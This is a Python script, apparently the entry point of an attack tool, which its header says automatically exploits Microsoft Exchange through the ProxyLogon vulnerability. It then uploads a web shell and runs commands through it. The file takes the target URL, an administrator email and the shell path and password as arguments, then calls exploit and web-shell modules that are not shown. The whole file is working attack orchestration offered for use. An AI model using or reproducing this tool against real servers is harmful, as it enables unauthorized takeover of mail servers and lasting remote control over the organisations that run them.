# ----------------------------------------------------------------------------
# 1. Automatically exploit Exchange server via Proxylogon vulnerability.
# 2. Run commands though uploaded Web shell.
# Author: Gabriel Hévr
# ---------------------------------------------------------------------------

import argparse
import time
from proxylogon import Proxylogon
from chopper import Chopper


def main():
    ### COMMAND LINE ARGS ###
    example_usage = "Example: python3 main.py -t https://10.0.0.10" \
                    " -e MegaCorpAdmin@megacorp.local" \
                    " -l C:\\Program Files\\Microsoft\\Exchange" \
                    "Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\EvilCorp.aspx" \
                    " -x http://127.0.0.1:8080" \
                    " -r /ecp/auth/EvilCorp.aspx" \
                    " -s EvilCorp"

    parser = argparse.ArgumentParser(epilog=example_usage)
    parser.add_argument("-x", "--proxy", help="Proxy to use")
    required_named_args = parser.add_argument_group("Required named arguments")
    required_named_args.add_argument("-t", "--target", help="Exchange Server URL", required=True)
    required_named_args.add_argument("-e", "--email", help="Administrator email", required=True)
    required_named_args.add_argument("-l", "--location", help="Where to upload payload", required=True)
    required_named_args.add_argument("-r", "--request", help="Path to request for chopper", required=True)
    required_named_args.add_argument("-s", "--password", help="Password for chopper", required=True)
    args = parser.parse_args()

    if not args.proxy:
        proxy = None
    else:
        proxy = args.proxy

    ### EXPLOIT ###
    proxylogon = Proxylogon(args.target, args.email, args.password, args.location, proxy)
    proxylogon.exploit()

    # wait for server
    time.sleep(5)

    ### POST EXPLOIT CHOPPER ###
    chopper = Chopper(args.request, args.target, args.password, proxy)
    chopper.run()


main()
